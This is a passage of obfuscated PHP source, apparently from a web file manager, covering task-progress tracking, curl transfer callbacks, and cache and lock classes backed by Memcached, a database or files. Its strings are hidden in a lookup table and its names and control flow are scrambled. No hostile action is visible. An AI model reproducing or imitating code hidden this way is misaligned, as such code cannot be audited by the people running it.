ƒ­…˜æ[$eè¬öÇ‹ó[1480]]; } goto fÇäøÂìÏŸ; fÇäøÂìÏŸ: } public function addPath($c­ïƒ„¾Ç“) { goto f˜öïªä—‡; f˜öïªä—‡: $dÖŞ„ŒÈôÄ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$c­ïƒ„¾Ç“) { return; } $eÊ´ÉÀ¡ =& $this->task; goto dò¶©Ñ¤õò; dò¶©Ñ¤õò: $bê¨œŒ÷š¶ = IO::infoWithChildren($c­ïƒ„¾Ç“); $F‚ö—Å†¸Å = $eÊ´ÉÀ¡[$dÖŞ„ŒÈôÄ[1533]] ? $eÊ´ÉÀ¡[$dÖŞ„ŒÈôÄ[1533]][$dÖŞ„ŒÈôÄ[1534]] : 0; $eÊ´ÉÀ¡[$dÖŞ„ŒÈôÄ[1533]] = array($dÖŞ„ŒÈôÄ[1534] => $F‚ö—Å†¸Å + 1, $dÖŞ„ŒÈôÄ[404] => $bê¨œŒ÷š¶[$dÖŞ„ŒÈôÄ[28]], $dÖŞ„ŒÈôÄ[75] => $bê¨œŒ÷š¶[$dÖŞ„ŒÈôÄ[75]], $dÖŞ„ŒÈôÄ[484] => $bê¨œŒ÷š¶[$dÖŞ„ŒÈôÄ[484]] ? $bê¨œŒ÷š¶[$dÖŞ„ŒÈôÄ[484]] : $bê¨œŒ÷š¶[$dÖŞ„ŒÈôÄ[75]]); goto bÉÁ‹«¸æç; bÉÁ‹«¸æç: if ($bê¨œŒ÷š¶[$dÖŞ„ŒÈôÄ[29]] == $dÖŞ„ŒÈôÄ[173]) { $eÊ´ÉÀ¡[$dÖŞ„ŒÈôÄ[973]] += 1; } else { $eÊ´ÉÀ¡[$dÖŞ„ŒÈôÄ[973]] += $bê¨œŒ÷š¶[$dÖŞ„ŒÈôÄ[80]][$dÖŞ„ŒÈôÄ[78]]; if ($bê¨œŒ÷š¶[$dÖŞ„ŒÈôÄ[387]]) { $eÊ´ÉÀ¡[$dÖŞ„ŒÈôÄ[973]] += $bê¨œŒ÷š¶[$dÖŞ„ŒÈôÄ[80]][$dÖŞ„ŒÈôÄ[79]] + 1; } } $eÊ´ÉÀ¡[$dÖŞ„ŒÈôÄ[692]] += $bê¨œŒ÷š¶[$dÖŞ„ŒÈôÄ[77]]; $this->update(); goto F°ÃÚ¥ ˆ; F°ÃÚ¥ ˆ: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($d„†éÄº’‹) { $fäÕ´Æ‹Œ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $aìŸ¨îºÕ‚ =& $this->task; $aìŸ¨îºÕ‚[$fäÕ´Æ‹Œ[1522]] = $d„†éÄº’‹[$fäÕ´Æ‹Œ[28]]; $aìŸ¨îºÕ‚[$fäÕ´Æ‹Œ[975]] = $d„†éÄº’‹[$fäÕ´Æ‹Œ[28]]; $this->update(); } public function copyFileStart($aåæó¼¬•‘, $CÖ…º¼ÕÅ, $CœİŸÊ›ô·, $A”²ˆ˜¥, $EÌáïó¨œ–, $A…ìÍ£ğÀ—) { goto D¹¸š¾«; B¡ÕÎòŸ²: $CÃâÕˆé—[$C……¡ôã«‡[1522]] = $Bƒº‘Å¹˜; $CÃâÕˆé—[$C……¡ôã«‡[1524]] = (int) $aåæó¼¬•‘->size($CÖ…º¼ÕÅ); $CÃâÕˆé—[$C……¡ôã«‡[1525]] = 0; goto Eî×ë²Û; Dº¯®«”õ¬: $this->update(); goto fÇÀš’»Ÿª; D¹¸š¾«: $C……¡ôã«‡ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Bƒº‘Å¹˜ = $EÌáïó¨œ–; if ($Bƒº‘Å¹˜ == $GLOBALS[$C……¡ôã«‡[1535]]) { $Bƒº‘Å¹˜ = $GLOBALS[$C……¡ôã«‡[1536]]; } goto bàî¢Â¨ÚŠ; Eî×ë²Û: $CÃâÕˆé—[$C……¡ôã«‡[975]] = $C……¡ôã«‡[33]; $CÃâÕˆé—[$C……¡ôã«‡[1526]] = $C……¡ôã«‡[33]; $CÃâÕˆé—[$C……¡ôã«‡[1527]] = 0; goto Dº¯®«”õ¬; bàî¢Â¨ÚŠ: $GLOBALS[$C……¡ôã«‡[1536]] = $EÌáïó¨œ–; $GLOBALS[$C……¡ôã«‡[1535]] = $A…ìÍ£ğÀ—; $CÃâÕˆé— =& $this->task; goto B¡ÕÎòŸ²; fÇÀš’»Ÿª: } public function copyFileEnd($Aªè‡®ÈŞñ, $b·«÷²Œò·, $Eè·ÆšŒÜ, $DÖÊÏöè‰, $dì˜…­¬Ï, $A«‚î°ò¿) { $B¯š¸³Øˆê =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $E¨îí¼Íõ =& $this->task; $E¨îí¼Íõ[$B¯š¸³Øˆê[1525]] = $E¨îí¼Íõ[$B¯š¸³Øˆê[1524]]; $E¨îí¼Íõ[$B¯š¸³Øˆê[1526]] = $B¯š¸³Øˆê[33]; if ($dì˜…­¬Ï == $E¨îí¼Íõ[$B¯š¸³Øˆê[1522]]) { $E¨îí¼Íõ[$B¯š¸³Øˆê[1528]] += $E¨îí¼Íõ[$B¯š¸³Øˆê[1524]]; $E¨îí¼Íõ[$B¯š¸³Øˆê[1529]] = $E¨îí¼Íõ[$B¯š¸³Øˆê[1528]]; $this->update(1); } else { $this->update(); $E¨îí¼Íõ[$B¯š¸³Øˆê[1525]] = 0; } self::log($B¯š¸³Øˆê[1537] . $b·«÷²Œò· . $B¯š¸³Øˆê[66] . $DÖÊÏöè‰ . $B¯š¸³Øˆê[227] . $dì˜…­¬Ï . $B¯š¸³Øˆê[1538] . $E¨îí¼Íõ[$B¯š¸³Øˆê[1522]]); } public function updateFileEnd($eŸ…ò‘ŒÓë, $F—ğ¬–…æ) { goto C¯ç·œÖ·; açËò‡½ñÙ: $this->update(1); self::log($DÓŞ…·®[1539] . $eŸ…ò‘ŒÓë); goto a±×†óœÓ†; C¯ç·œÖ·: $DÓŞ…·® =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $AõÈÇ£Ì£† =& $this->task; $AõÈÇ£Ì£†[$DÓŞ…·®[1522]] = $eŸ…ò‘ŒÓë; goto A§¥Óğ¼ºÊ; A§¥Óğ¼ºÊ: $AõÈÇ£Ì£†[$DÓŞ…·®[1524]] = $F—ğ¬–…æ; $AõÈÇ£Ì£†[$DÓŞ…·®[1528]] += $F—ğ¬–…æ; $AõÈÇ£Ì£†[$DÓŞ…·®[1529]] = $AõÈÇ£Ì£†[$DÓŞ…·®[1528]]; goto açËò‡½ñÙ; a±×†óœÓ†: } public function sourceModelCopy($D­ñë„Ú­ê) { goto Bœîâ Şâå; b½…¶¿ƒ®Î: $cØñØÒÌšŸ =& $this->task; $this->sourceModelCopyFlag = !0; $c²Óã§„±¬ = 0; goto f„Íƒ› ±; f„Íƒ› ±: switch ($e¸ê©ó‰Ôö) { case $FõÂ§Òù†[524]: $c²Óã§„±¬ = 1; break; case $FõÂ§Òù†[527]: $cØñØÒÌšŸ[$FõÂ§Òù†[1522]] = $f§—ºÚë[$FõÂ§Òù†[28]]; break; case $FõÂ§Òù†[529]: $c²Óã§„±¬ = intval($D­ñë„Ú­ê[$FõÂ§Òù†[372]] * 0.4); break; case $FõÂ§Òù†[531]: $c²Óã§„±¬ = intval($D­ñë„Ú­ê[$FõÂ§Òù†[372]] * 0.2); break; case $FõÂ§Òù†[533]: $c²Óã§„±¬ = intval($D­ñë„Ú­ê[$FõÂ§Òù†[372]] * 0.4); break; } $this->update($c²Óã§„±¬); $this->sourceModelCopyFlag = !1; goto eÛ„êÊÒ; Bœîâ Şâå: $FõÂ§Òù† =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $e¸ê©ó‰Ôö = $D­ñë„Ú­ê[0]; $f§—ºÚë = $D­ñë„Ú­ê[1]; goto b½…¶¿ƒ®Î; eÛ„êÊÒ: } public function sourceRemove($D¸ÎÍõ¾ää, $eá¢Æ¶ªÆ) { $Aš÷Ù¢ò¸á =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $this->sourceModelCopyFlag = !0; $A®µ®ÂÂø = 1; if (isset($D¸ÎÍõ¾ää[$Aš÷Ù¢ò¸á[80]])) { $A®µ®ÂÂø = $D¸ÎÍõ¾ää[$Aš÷Ù¢ò¸á[80]][$Aš÷Ù¢ò¸á[78]] + $D¸ÎÍõ¾ää[$Aš÷Ù¢ò¸á[80]][$Aš÷Ù¢ò¸á[79]] + 1; } $this->update($A®µ®ÂÂø); $this->sourceModelCopyFlag = !1; } public function sourceMove($d“·™•­ŠÉ) { $this->sourceRemove($d“·™•­ŠÉ, !1); } public function curlProgress($aÂ¾°Ë¾õ, $cŒ¹øœ›ºğ, $a¬™Ëæà, $dÂùÒó†‰, $Fù§›õØÒä) { $EÄğï”ŒŠ¶ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $d†»ªªô°Ï =& $this->task; if ($Fù§›õØÒä > 0) { $d†»ªªô°Ï[$EÄğï”ŒŠ¶[975]] = $EÄğï”ŒŠ¶[1540]; $d†»ªªô°Ï[$EÄğï”ŒŠ¶[1526]] = $EÄğï”ŒŠ¶[106]; if ($d†»ªªô°Ï[$EÄğï”ŒŠ¶[1524]]) { $d†»ªªô°Ï[$EÄğï”ŒŠ¶[1525]] = $Fù§›õØÒä; } if ($d†»ªªô°Ï[$EÄğï”ŒŠ¶[1527]]) { $d†»ªªô°Ï[$EÄğï”ŒŠ¶[1525]] = $Fù§›õØÒä + $d†»ªªô°Ï[$EÄğï”ŒŠ¶[1527]]; } } else { if ($a¬™Ëæà > 0) { if ($d†»ªªô°Ï[$EÄğï”ŒŠ¶[1524]] == $cŒ¹øœ›ºğ) { $d†»ªªô°Ï[$EÄğï”ŒŠ¶[1525]] = $a¬™Ëæà; $d†»ªªô°Ï[$EÄğï”ŒŠ¶[975]] = $EÄğï”ŒŠ¶[1541]; $d†»ªªô°Ï[$EÄğï”ŒŠ¶[1526]] = $EÄğï”ŒŠ¶[1045]; } } } $this->update(); } public function curlProgressStart($F–µÃµê´“) { } public function curlProgressEnd($aªÕ“äÁ«ö) { goto BµÂ–¯®Ä; CäŞöá™éé: $this->update(); goto fƒ¬¿ù¶¡©; bö¥éõÖªß: $B¹ï¬‰·Ò = $d¨İØÇ³é²[$a‘„“‚ö¾«[1542]]; if ($B¹ï¬‰·Ò == -1) { $B¹ï¬‰·Ò = $d¨İØÇ³é²[$a‘„“‚ö¾«[1543]]; } if ($b„†‰³’ó®[$a‘„“‚ö¾«[1526]] == $a‘„“‚ö¾«[106] && $B¹ï¬‰·Ò) { $b„†‰³’ó®[$a‘„“‚ö¾«[1527]] += $B¹ï¬‰·Ò; } goto CäŞöá™éé; BµÂ–¯®Ä: $a‘„“‚ö¾« =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $b„†‰³’ó® =& $this->task; $d¨İØÇ³é² = curl_getinfo($aªÕ“äÁ«ö); goto bö¥éõÖªß; fƒ¬¿ù¶¡©: } } class TaskHttp extends Task { protected function startAfter() { $a‰÷¯¨ÆÄ® =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $fÇŞ³·«í˜ =& $this->task; $fÇŞ³·«í˜[$a‰÷¯¨ÆÄ®[1544]] = 1; Hook::bind($a‰÷¯¨ÆÄ®[1516], array($this, $a‰÷¯¨ÆÄ®[1545])); Hook::bind($a‰÷¯¨ÆÄ®[1518], array($this, $a‰÷¯¨ÆÄ®[1546])); Hook::bind($a‰÷¯¨ÆÄ®[1520], array($this, $a‰÷¯¨ÆÄ®[1547])); } protected function endAfter() { $FŒîø¢õçê =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; Hook::unbind($FŒîø¢õçê[1516], array($this, $FŒîø¢õçê[1545])); Hook::unbind($FŒîø¢õçê[1518], array($this, $FŒîø¢õçê[1546])); Hook::unbind($FŒîø¢õçê[1520], array($this, $FŒîø¢õçê[1547])); } public function progressStart($C„Æœê) { $b ã„Œ¨Ôö =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $EÉ‡Ë¡òÍ’ = curl_getinfo($C„Æœê); self::log($b ã„Œ¨Ôö[1548] . $EÉ‡Ë¡òÍ’[$b ã„Œ¨Ôö[303]]); self::valueSet($this->task[$b ã„Œ¨Ôö[385]], $this->task); } public function progressEnd($aÀÂ“ğ¼è²) { $E§·Âåˆ–Š =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; self::log($E§·Âåˆ–Š[1549] . $this->task[$E§·Âåˆ–Š[385]]); $this->end(); } public function progress($c‰í†§ß±›, $c‹ÂÇÈ‘Ìª, $dÅøŠ­ÔŒø, $aºì—·, $AÍª½ãÆÅ) { $A®®´Š†Ì‡ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $eåô¼ÛŒÈç =& $this->task; if ($AÍª½ãÆÅ > 0) { $eåô¼ÛŒÈç[$A®®´Š†Ì‡[973]] = $eåô¼ÛŒÈç[$A®®´Š†Ì‡[973]] == 0 ? $aºì—· : $eåô¼ÛŒÈç[$A®®´Š†Ì‡[973]]; $eåô¼ÛŒÈç[$A®®´Š†Ì‡[987]] = $AÍª½ãÆÅ; } else { if ($dÅøŠ­ÔŒø > 0) { $eåô¼ÛŒÈç[$A®®´Š†Ì‡[973]] = $eåô¼ÛŒÈç[$A®®´Š†Ì‡[973]] == 0 ? $c‹ÂÇÈ‘Ìª : $eåô¼ÛŒÈç[$A®®´Š†Ì‡[973]]; $eåô¼ÛŒÈç[$A®®´Š†Ì‡[987]] = $dÅøŠ­ÔŒø; } } $this->update(); self::log("\x70\x72\x6f\147\162\145\163\x73\x48\164\164\160\x3a\x64\x6f\167\x6e\x3a{$dÅøŠ­ÔŒø}\57{$c‹ÂÇÈ‘Ìª}\73\x20\x75\160\154\x6f\x61\x64\x3a{$AÍª½ãÆÅ}\x2f{$aºì—·}\73"); } } goto Bì÷é‘ñé; FçªÑÚ°—š: class CacheLockMemcached { public function lock($C¦¯Ó¥Úñ, $a÷Ñ«»ŒÆ = 0) { $C°‚§§çÎÌ = Cache::init(); $Cä›‚ä›ª = microtime(!0) + $a÷Ñ«»ŒÆ; while (microtime(!0) < $Cä›‚ä›ª) { $bÏ®á“ÊÂ = $C°‚§§çÎÌ->get($C¦¯Ó¥Úñ); if (!$bÏ®á“ÊÂ || $bÏ®á“ÊÂ < microtime(!0)) { $cíÓ”ˆÉ…Ç = $C°‚§§çÎÌ->handle->add($C¦¯Ó¥Úñ, $Cä›‚ä›ª, $a÷Ñ«»ŒÆ); if ($cíÓ”ˆÉ…Ç) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($f·ò÷¢À˜) { return Cache::init()->get($f·ò÷¢À˜); } public function unlock($eá‰„–³†) { return Cache::init()->remove($eá‰„–³†); } } class CacheLockDatabase { public function lock($c™ŞÇé†Ö´, $fîí•£Àé = 0) { $eÑÔƒãÌìœ = Model($_SERVER[ó¬â¥‰ÊÔ¤Ç£][749]); $Aò¨„–‚æ­ = microtime(!0) + $fîí•£Àé; while (microtime(!0) < $Aò¨„–‚æ­) { $B’”™ÌÌø = $eÑÔƒãÌìœ->get($c™ŞÇé†Ö´); if (!$B’”™ÌÌø || $B’”™ÌÌø < microtime(!0)) { $fçÆ¿è—ª = $eÑÔƒãÌìœ->set($c™ŞÇé†Ö´, $Aò¨„–‚æ­); if ($fçÆ¿è—ª) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($E¹Ï…Óíİ«) { return Model($_SERVER[ó¬â¥‰ÊÔ¤Ç£][749])->get($E¹Ï…Óíİ«); } public function unlock($CæİÇ¡‰Õë) { Model($_SERVER[ó¬â¥‰ÊÔ¤Ç£][749])->remove($CæİÇ¡‰Õë); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($E†ªí¯ˆ, $d¬‡½«Áªë) { $eÛªÀš‘Æõ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!class_exists($eÛªÀš‘Æõ[776])) { show_json($eÛªÀš‘Æõ[777], !1); } $this->cacheTime = $d¬‡½«Áªë; $this->handle = new Memcached(); if (is_array($E†ªí¯ˆ[$eÛªÀš‘Æõ[778]]) && count($E†ªí¯ˆ[$eÛªÀš‘Æõ[778]]) >= 1) { foreach ($E†ªí¯ˆ[$eÛªÀš‘Æõ[778]] as $cÏçˆÜÌ›ª) { $BË‡ßæéì = explode($eÛªÀš‘Æõ[4], $cÏçˆÜÌ›ª); $this->handle->addServer($BË‡ßæéì[0], $BË‡ßæéì[1]); } } else { $this->handle->addServer($E†ªí¯ˆ[$eÛªÀš‘Æõ[175]], $E†ªí¯ˆ[$eÛªÀš‘Æõ[176]]); } } public function set($CÊíõìÃ¶Š, $aŠ«ƒ¬ÛÔÎ, $B½à•½ŒÁ© = false) { $B½à•½ŒÁ© = $B½à•½ŒÁ© ? $B½à•½ŒÁ© : $this->cacheTime; return $this->handle->set($CÊíõìÃ¶Š, $aŠ«ƒ¬ÛÔÎ, $B½à•½ŒÁ©); } public function get($EÃ°¼«‘´) { return $this->handle->get($EÃ°¼«‘´); } public function remove($fç¦É¨ª‡î) { return $this->handle->delete($fç¦É¨ª‡î); } public function deleteAll() { return $this->handle->flush(); } } goto A´‚ĞŒÚ°Ò; F×•Õ…æ¹´: class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto FÒ©Ûï¤¤ª; Bå”ò¸ä½ª: switch ($B¦èù’ìËÎ[$a³ã»Ÿ¶–[747]]) { case $a³ã»Ÿ¶–[17]: self::$handle = Model($a³ã»Ÿ¶–[749]); break; case $a³ã»Ÿ¶–[750]: self::$handle = new CacheRedis($FĞÅÏãÏÖ, $Dœ‹Ô¹éĞ); break; case $a³ã»Ÿ¶–[751]: self::$handle = new CacheMemcached($FĞÅÏãÏÖ, $Dœ‹Ô¹éĞ); break; case $a³ã»Ÿ¶–[173]: self::$handle = new CacheFile($FĞÅÏãÏÖ, $Dœ‹Ô¹éĞ); break; default: break; } return self::$handle; goto d«æíÄƒ˜ª; FÒ©Ûï¤¤ª: $a³ã»Ÿ¶– =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto fŸÍÍÃÒ®; fŸÍÍÃÒ®: $B¦èù’ìËÎ = $GLOBALS[$a³ã»Ÿ¶–[6]][$a³ã»Ÿ¶–[345]]; $FĞÅÏãÏÖ = $B¦èù’ìËÎ[$B¦èù’ìËÎ[$a³ã»Ÿ¶–[747]]]; $Dœ‹Ô¹éĞ = $B¦èù’ìËÎ[$a³ã»Ÿ¶–[748]]; goto Bå”ò¸ä½ª; d«æíÄƒ˜ª: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($b··¬çÆ…ñ) { if (is_array($b··¬çÆ…ñ) || is_object($b··¬çÆ…ñ)) { $b··¬çÆ…ñ = json_encode($b··¬çÆ…ñ); } $b··¬çÆ…ñ = rawurlencode($b··¬çÆ…ñ); return md5(KOD_SITE_ID . $_SERVER[ó¬â¥‰ÊÔ¤Ç£][70] . $b··¬çÆ…ñ); } public static function get($eãíÃ·ØİÎ) { $e¥™™„¶„õ = self::key($eãíÃ·ØİÎ); if (!isset(self::$memoryCache[$e¥™™„¶„õ])) { $eå×àâé‰À = self::init()->get($e¥™™„¶„õ); self::$memoryCache[$e¥™™„¶„õ] = unserialize($eå×àâé‰À); } return self::$memoryCache[$e¥™™„¶„õ]; } public static function set($DÌÅ™¶Ş, $Fëâ»ì§£½, $A‰·’§Í¼› = false) { goto c¢‰áóÃ¶; bÛŒ•´ÄÖà: CacheLock::lock($DÌÅ™¶Ş); $c‘¶ŞÓËÜö = self::init()->set($b†Şµ‚‡¦¹, serialize($Fëâ»ì§£½), $A‰·’§Í¼›); self::$memoryCache[$b†Şµ‚‡¦¹] = $Fëâ»ì§£½; goto CÕ°«Ş†ø; c¢‰áóÃ¶: $b†Şµ‚‡¦¹ = self::key($DÌÅ™¶Ş); if (isset(self::$memoryCache[$b†Şµ‚‡¦¹]) && self::$memoryCache[$b†Şµ‚‡¦¹] === $Fëâ»ì§£½) { return !0; } if ($A‰·’§Í¼› === 0) { self::$memoryCache[$b†Şµ‚‡¦¹] = $Fëâ»ì§£½; return !0; } goto bÛŒ•´ÄÖà; CÕ°«Ş†ø: CacheLock::unlock($DÌÅ™¶Ş); return $c‘¶ŞÓËÜö; goto d¤Ø‹§¨İ; d¤Ø‹§¨İ: } public static function remove($Eƒ„íÚŒÓİ) { goto aõ¬ùÙÌéç; bÄ§ÉŸÑ™Æ: return $e¢ƒõ‹â«Ö; goto C¢¿›±‚Ó«; aõ¬ùÙÌéç: $d¥¤ë©¸Î = self::key($Eƒ„íÚŒÓİ); unset(self::$memoryCache[$d¥¤ë©¸Î]); self::clearTimeout(); goto fÚ‚Ú¢êñ; fÚ‚Ú¢êñ: CacheLock::lock($Eƒ„íÚŒÓİ); $e¢ƒõ‹â«Ö = self::init()->remove($d¥¤ë©¸Î); CacheLock::unlock($Eƒ„íÚŒÓİ); goto bÄ§ÉŸÑ™Æ; C¢¿›±‚Ó«: } public static function removeMemory($cÕ´Üá†”) { $bÄÔĞÄÃÁÅ = self::key($cÕ´Üá†”); unset(self::$memoryCache[$bÄÔĞÄÃÁÅ]); } public static function clearMemory($d§—Á´íÄÔ = false) { if ($d§—Á´íÄÔ) { $d§—Á´íÄÔ = self::key($d§—Á´íÄÔ); unset(self::$memoryCache[$d§—Á´íÄÔ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ó¬â¥‰ÊÔ¤Ç£][752])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ó¬â¥‰ÊÔ¤Ç£][753])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($C÷é¸ÁÁÆÏ, $d˜†Í‰¦‡») { $Eå‘æ‡ã‚ğ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $this->cachePath = $C÷é¸ÁÁÆÏ[$Eå‘æ‡ã‚ğ[75]]; $this->prefix = $Eå‘æ‡ã‚ğ[754]; $this->cacheTime = $d˜†Í‰¦‡»; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($C¾ÖˆÉ¯ù) { $EÇ¬íÕ˜¶ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $C¾ÖˆÉ¯ù = str_replace(array($EÇ¬íÕ˜¶[755], $EÇ¬íÕ˜¶[96], $EÇ¬íÕ˜¶[69]), $EÇ¬íÕ˜¶[756], $C¾ÖˆÉ¯ù); return $this->cachePath . $EÇ¬íÕ˜¶[757] . $C¾ÖˆÉ¯ù . $EÇ¬íÕ˜¶[758]; } public function set($cÂ¤âë‰›, $fÜ³õ¥èœ, $f¨Ã¸Ş¢¾” = false) { $A„òÒ…Œ°¡ = $this->getFile($cÂ¤âë‰›); if (file_put_contents($A„òÒ…Œ°¡, $this->prefix . $fÜ³õ¥èœ, LOCK_EX)) { return !0; } @unlink($A„òÒ…Œ°¡); return !1; } public function get($d©‚²²ÁòÎ) { $E–‡ÑñïÉÂ = $this->getFile($d©‚²²ÁòÎ); if (file_exists($E–‡ÑñïÉÂ) && filemtime($E–‡ÑñïÉÂ) < time() - $this->cacheTime) { @unlink($E–‡ÑñïÉÂ); return !1; } $F¢¶¥ˆ²÷ó = @file_get_contents($E–‡ÑñïÉÂ); return substr($F¢¶¥ˆ²÷ó, strlen($this->prefix)); } public function remove($F†ÚÑ¨¶åî) { $b…ªÚ‘ì = $this->getFile($F†ÚÑ¨¶åî); return @unlink($b…ªÚ‘ì); } public function deleteAll() { $dØĞø³ö†‹ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $BäÁä¬ˆÌ = scandir($this->cachePath); foreach ($BäÁä¬ˆÌ as $AÌ È‚§³) { $dğ«ßóƒô› = $this->cachePath . $AÌ È‚§³; if (strpos($dğ«ßóƒô›, $dØĞø³ö†‹[758]) && strpos($dğ«ßóƒô›, $dØĞø³ö†‹[759])) { @unlink($dğ«ßóƒô›); } } } public function clearTimeout() { $eÈÔï†Ö¬° =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $eÅØìÌ‰„š = scandir($this->cachePath); foreach ($eÅØìÌ‰„š as $eï•’¶÷¢Ú) { $Aá‘õ¿×É´ = $this->cachePath . $eï•’¶÷¢Ú; if (strpos($Aá‘õ¿×É´, $eÈÔï†Ö¬°[758]) && strpos($Aá‘õ¿×É´, $eÈÔï†Ö¬°[759]) && filemtime($Aá‘õ¿×É´) < time() - $this->cacheTime) { @unlink($Aá‘õ¿×É´); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto D„¢¸°ŠòÄ; d½òÅŸÎìö: self::$timeout = $eâ÷¸§Æë[$dÑªìÚĞ‡à[760]] ? $eâ÷¸§Æë[$dÑªìÚĞ‡à[760]] : 10; $e•ÉĞŸ¿Ş‡ = _get($GLOBALS[$dÑªìÚĞ‡à[6]], $dÑªìÚĞ‡à[761]); $EËèé¡Ÿ© = $eâ÷¸§Æë[$dÑªìÚĞ‡à[747]] ? $eâ÷¸§Æë[$dÑªìÚĞ‡à[747]] : $dÑªìÚĞ‡à[173]; goto AÕ‘á‘‰Ë; AÕ‘á‘‰Ë: if ($EËèé¡Ÿ© == $dÑªìÚĞ‡à[17] && $e•ÉĞŸ¿Ş‡ == $dÑªìÚĞ‡à[9]) { $EËèé¡Ÿ© = $dÑªìÚĞ‡à[173]; } switch ($EËèé¡Ÿ©) { case $dÑªìÚĞ‡à[750]: self::$handle = new CacheLockRedis(); break; case $dÑªìÚĞ‡à[751]: self::$handle = new CacheLockMemcached(); break; case $dÑªìÚĞ‡à[17]: self::$handle = new CacheLockDatabase(); break; case $dÑªìÚĞ‡à[173]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto E»˜èÜí„; D„¢¸°ŠòÄ: $dÑªìÚĞ‡à =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (self::$handle) { return self::$handle; } $eâ÷¸§Æë = $GLOBALS[$dÑªìÚĞ‡à[6]][$dÑªìÚĞ‡à[345]]; goto d½òÅŸÎìö; E»˜èÜí„: } private static function key($bì«ô‘‚™Š) { return $_SERVER[ó¬â¥‰ÊÔ¤Ç£][762] . Cache::key($bì«ô‘‚™Š); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($F…‰´·ĞÅ = '') { self::$errorMsg = $F…‰´·ĞÅ; } public static function lockGlobal($eÀƒÔÃ§½, $EÌ¼Í¼’ÁŒ) { return self::lock($eÀƒÔÃ§½, $EÌ¼Í¼’ÁŒ, !0); } public static function lock($cë£‘¬˜æœ, $cãù¼ÑŒ” = false, $fÙ¹Ë›Å‡ = false) { goto bÓ¡é¢ƒˆ¥; bÓ¡é¢ƒˆ¥: $DÑÀ…¸·“ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $cµì‚İ¾±Ğ = self::init(); $f½‡²áëºÏ = self::key($cë£‘¬˜æœ); goto dÇ²†¾Äõ§; dÇ²†¾Äõ§: $cãù¼ÑŒ” = $cãù¼ÑŒ” ? $cãù¼ÑŒ” : self::$timeout; $Fœ»õŒ–³‹ = $cµì‚İ¾±Ğ->lock($f½‡²áëºÏ, $cãù¼ÑŒ”); if (!$Fœ»õŒ–³‹) { $D­¿Æª… = "\x6c\x6f\x63\153\40\x65\162\162\x6f\x72\x3b\x6b\145\171\75{$f½‡²áëºÏ}\x3b\164\x69\x6d\x65\75{$cãù¼ÑŒ”}\x3b" . self::$errorMsg . $DÑÀ…¸·“[67] . get_caller_msg(); $d½Ó›‡ĞŸ = LNG($DÑÀ…¸·“[763]) . "\x28{$cãù¼ÑŒ”}\x73\x29\56" . LNG($DÑÀ…¸·“[764]); $d½Ó›‡ĞŸ .= $DÑÀ…¸·“[765]; if (is_string(self::$errorMsg) && self::$errorMsg) { $d½Ó›‡ĞŸ = $d½Ó›‡ĞŸ . $DÑÀ…¸·“[766] . self::$errorMsg; } write_log($D­¿Æª…, $DÑÀ…¸·“[767]); show_json($d½Ó›‡ĞŸ, !1); } goto dÓ˜Ô†Î“ª; dÓ˜Ô†Î“ª: if (!$fÙ¹Ë›Å‡) { self::$lockItem[$f½‡²áëºÏ] = !0; } return $Fœ»õŒ–³‹; goto d×Š»ª»‚; d×Š»ª»‚: } public static function lockGet($fÂÇ¬éÏØ½) { $aÇ„²èá¸§ = self::key($fÂÇ¬éÏØ½); if (self::$lockItem[$aÇ„²èá¸§]) { return self::$lockItem[$aÇ„²èá¸§]; } return self::init()->lockGet($aÇ„²èá¸§); } public static function unlock($AóÆØ¾¶íæ) { $dŠññÓã…Ì = self::key($AóÆØ¾¶íæ); self::$lockItem[$dŠññÓã…Ì] = null; return self::init()->unlock($dŠññÓã…Ì); } public static function unlockRuntime() { $b“Èøœõ¯è =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $F÷¹„¡¡Åì = self::init(); $e¢±â†ÚœÛ = !1; foreach (self::$lockItem as $FšÍ„¹Æ¬Ù => $F‡óÎ¯×ì«) { if (!$F‡óÎ¯×ì«) { continue; } $F÷¹„¡¡Åì->unlock($FšÍ„¹Æ¬Ù); if (!$e¢±â†ÚœÛ) { $e¢±â†ÚœÛ = !0; write_log($b“Èøœõ¯è[768] . $FšÍ„¹Æ¬Ù . $b“Èøœõ¯è[67] . get_caller_msg(), $b“Èøœõ¯è[767]); continue; } 